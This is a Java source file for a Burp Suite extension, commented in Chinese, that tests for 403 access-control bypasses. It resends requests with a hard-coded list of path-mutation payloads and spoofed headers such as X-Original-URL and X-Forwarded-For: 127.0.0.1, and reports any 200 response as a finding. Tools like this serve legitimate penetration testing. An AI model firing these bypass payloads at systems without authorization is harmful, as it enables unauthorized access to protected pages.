package com.bypass;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.logging.Logging;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.ScanCheck;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

/**
 * Burp Suite插件主类，实现403绕过检测功能
 * 提供右键菜单扫描和被动扫描两种检测方式
 */
public class BurpExtender implements BurpExtension, ContextMenuItemsProvider {
    private MontoyaApi api;
    private Logging logging;

        /**
     * 插件初始化方法
     * @param api Burp提供的API接口
     */
    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.logging = api.logging();
        
        api.extension().setName("403 Directory Bypasser");
        api.logging().logToOutput("[INFO] 插件初始化完成");
        api.scanner().registerScanCheck(new DirectoryBypassScanCheck());
        api.userInterface().registerContextMenuItemsProvider(this);
    }
    
    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> listMenuItems = new ArrayList<>();
        JMenuItem menuItem = new JMenuItem("Scan this request");
        
        listMenuItems.add(menuItem);
        
        menuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                try {
                    List<HttpRequestResponse> selectedRequests = event.selectedRequestResponses();
                    final HttpRequestResponse selectedRequest = selectedRequests.get(0);
                    logging.logToOutput("[INFO] 开始扫描选中的请求: " + selectedRequest.request().url());
                    
                    // 使用SwingWorker在后台线程执行HTTP请求
                    SwingWorker<AuditResult, Void> worker = new SwingWorker<AuditResult, Void>() {
                        @Override
                        protected AuditResult doInBackground() {
                            DirectoryBypassScanCheck scanCheck = new DirectoryBypassScanCheck();
                            return scanCheck.passiveAudit(selectedRequest);
                        }
                        
                        @Override
                        protected void done() {
                            try {
                                AuditResult result = get();
                                if (result != null) {
                                    logging.logToOutput("[SUCCESS] 扫描完成，发现漏洞");
                                } else {
                                    logging.logToOutput("[INFO] 扫描完成，未发现漏洞");
                                }
                            } catch (Exception e) {
                                logging.logToError("[ERROR] 扫描过程发生错误: " + e.getMessage());
                            }
                        }
                    };
                    worker.execute();
                } catch (Exception e) {
                    logging.logToError("[ERROR] 扫描过程发生错误: " + e.getMessage());
                }
            }
        });
        
        return listMenuItems;
    }

        /**
     * 检查状态码是否匹配403/401/302
     * @param statusCode HTTP状态码
     * @return 是否匹配目标状态码
     */
    private boolean getMatches(int statusCode) {
        return statusCode == 403;
    }

        /**
     * 替换HTTP头信息
     * @param headerStr 原始头信息
     * @param headerName 要替换的头名称
     * @param newHeader 新的头内容
     * @return 替换后的头信息
     */
    private String replaceHeader(String headerStr, String headerName, String newHeader) {
        Pattern pattern = Pattern.compile("^" + headerName + ":.*$", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE);
        Matcher matcher = pattern.matcher(headerStr);
        return matcher.replaceFirst(newHeader);
    }

    private class DirectoryBypassScanCheck implements ScanCheck {
        @Override
        public AuditResult passiveAudit(HttpRequestResponse baseRequestResponse) {
            // logging.logToOutput("[DEBUG] 进入被动扫描方法，开始处理请求");
            // logging.logToOutput("[DEBUG] 请求URL: " + baseRequestResponse.request().url());
            // logging.logToOutput("[DEBUG] 响应状态码: " + baseRequestResponse.response().statusCode());
            
            // 检查响应状态码是否符合403/401/302
            if (!getMatches(baseRequestResponse.response().statusCode())) {
                logging.logToOutput("[INFO] 状态码不匹配，跳过扫描");
                return null;
            }

            String originalUrl = baseRequestResponse.request().url().toString();
            String rUrl = originalUrl;
            if (!rUrl.equals("/")) {
                rUrl = rUrl.replaceAll("/+$", "");
            }

            String previousPath = rUrl.substring(0, rUrl.lastIndexOf('/'));
            String lastPath = rUrl.substring(rUrl.lastIndexOf('/') + 1);
                        logging.logToOutput("[INFO] 开始扫描URL: " + rUrl);
            // logging.logToOutput("[DEBUG] 请求头信息: " + baseRequestResponse.request().headers().toString());

            String[] payloads = {
                lastPath + ";.js",
                lastPath + ".;/",
                lastPath + "/;",
                lastPath + "..;/",
                lastPath + "?",
                lastPath + "??",
                lastPath + " /",
                lastPath + ";.css",
                lastPath + "%3b",
                lastPath + "%3b.js",
                "%2e/" + lastPath,
                "%09" + lastPath,
                "%20" + lastPath,
                lastPath + "%20/",
                lastPath + "%09"
            };

            String[] hPayloads = {
                "X-Rewrite-URL: " + originalUrl,
                "X-Original-URL: " + originalUrl,
                "Referer: /" + lastPath,
                "X-Custom-IP-Authorization: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "X-Forwarded-For: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "X-Host: 127.0.0.1",
                "X-Forwarded-Host: 127.0.0.1"
            };

            List<String> results = new ArrayList<>();

            // URL Payload测试
            for (String p : payloads) {
                HttpRequest newRequest = baseRequestResponse.request().withPath(previousPath + "/" + p);
                HttpRequestResponse checkRequestResponse = api.http().sendRequest(newRequest);
                
                if (checkRequestResponse.response().statusCode() == 200) {
                    logging.logToOutput("[SUCCESS] 发现有效载荷: " + newRequest.path());
                    results.add("Url payload: " + newRequest.path() +
                            " | Status code: " + checkRequestResponse.response().statusCode());
                }
            }

            // Header Payload测试
            for (String hp : hPayloads) {
                HttpRequest newRequest;
                if (hp.startsWith("X-Original-URL:")) {
                    newRequest = baseRequestResponse.request().withPath(rUrl + "abcdefg");
                    String[] headerParts = hp.split(":", 2);
                    newRequest = newRequest.withAddedHeader(headerParts[0].trim(), headerParts[1].trim());
                }
                else if (hp.startsWith("X-Rewrite-URL:")) {
                    newRequest = baseRequestResponse.request().withPath("/");
                    String[] headerParts = hp.split(":", 2);
                    newRequest = newRequest.withAddedHeader(headerParts[0].trim(), headerParts[1].trim());
                }
                else if (hp.startsWith("Referer:")) {
                    newRequest = baseRequestResponse.request().withUpdatedHeader("Referer", "/" + lastPath);
                }
                else {
                    String[] headerParts = hp.split(":", 2);
                    newRequest = baseRequestResponse.request().withAddedHeader(headerParts[0].trim(), headerParts[1].trim());
                }

                HttpRequestResponse checkRequestResponse = api.http().sendRequest(newRequest);
                if (checkRequestResponse.response().statusCode() == 200) {
                    logging.logToOutput("[SUCCESS] 发现有效载荷: " + newRequest.path() + ", 头部: " + hp);
                    results.add("Header payload: " + hp + " | Status code: " + checkRequestResponse.response().statusCode());
                }
            }

                        if (results.isEmpty()) {
                logging.logToOutput("[INFO] 未发现可绕过的403漏洞");
                return null;
            }

            AuditIssue issue = AuditIssue.auditIssue(
                "403 Bypass Vulnerability",
                String.join("<br>", results),
                "The application appears to be vulnerable...",
                baseRequestResponse.request().url(),
                AuditIssueSeverity.HIGH, 
                AuditIssueConfidence.CERTAIN,
                "Verify the server's access control...",  // background
                "The application's access controls...",   // remediationBackground 
                AuditIssueSeverity.HIGH,                  // typicalSeverity
                List.of(baseRequestResponse)
            );

                        logging.logToOutput("[SUCCESS] 发现403绕过漏洞: " + issue.name());
            return AuditResult.auditResult(List.of(issue));
        }

        @Override
        public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint) {
            // Implement the active audit logic here
            return null;
        }

        @Override
        public ConsolidationAction consolidateIssues(AuditIssue existingIssue, AuditIssue newIssue) {
            if (existingIssue.baseUrl().equals(newIssue.baseUrl())) {
                return ConsolidationAction.KEEP_EXISTING;
            }
            return ConsolidationAction.KEEP_BOTH;
        }
    }
}

